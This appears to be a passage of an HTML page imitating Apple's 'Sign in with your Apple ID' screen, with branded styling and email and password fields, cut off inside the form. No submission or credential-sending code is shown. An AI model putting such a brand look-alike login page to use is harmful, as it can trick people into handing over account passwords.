<!DOCTYPE html>
<html>
<head>
	<title>Apple ID Login</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=SF+Pro+Display:regular,medium,bold">
	<style>
		body {
			background-color: #f5f5f7;
			font-family: 'SF Pro Display', sans-serif;
		}

		.container {
			margin-top: 50px;
			padding: 0 15px;
		}

		h1, h2 {
			font-weight: bold;
			text-align: center;
			color: #333;
		}

		h2 {
			font-size: 1.5rem;
			margin-bottom: 40px;
		}

		.form-group {
			margin-bottom: 25px;
		}

		.form-control {
			border-radius: 0;
			border: none;
			background-color: #f5f5f7;
			font-size: 1.125rem;
			padding: 16px 20px;
			height: 64px;
			box-shadow: none;
		}

		.form-control:focus {
			border-color: #333;
			box-shadow: none;
		}

		.form-check {
			margin-top: 25px;
			margin-bottom: 25px;
		}

		.btn-primary {
			border-radius: 0;
			border: none;
			background-color: #007aff;
			font-size: 1.125rem;
			font-weight: bold;
			padding: 16px 40px;
			box-shadow: none;
			margin-top: 40px;
			display: block;
			width: 100%;
		}

		.btn-primary:hover {
			background-color: #006fe6;
		}

		.footer {
			margin-top: 40px;
			color: #666;
			font-size: 0.875rem;
			text-align: center;
		}
	</style>
</head>
<body>

<div class="container">
	<h1>Apple</h1>
	<h2>Sign in with your Apple ID</h2>
	<form id="login-form">
		<div class="form-group">
			<label for="email">Apple ID</label>
			<input type="email" class="form-control" id="email" placeholder="Enter your Apple ID">
		</div>
		<div class="form-group">
			<label for="password">Password</label>
			<input type="password" class="form-control" id="password" placeholder="Enter your password">
			<small id="password-help" class="form-text text-muted">Your password must be at least 8 characters and include a number, an uppercase letter, and a lowercase letter.</small>
		</div>
		<div class="form-check">
			<input type="checkbox" class="form-check-input" id="remember-me">
			<label class="form-check-label" for="remember-me">Remember me</label>
		</div>
		<button type="submit" class="btn btn-primary">Sign in</button>
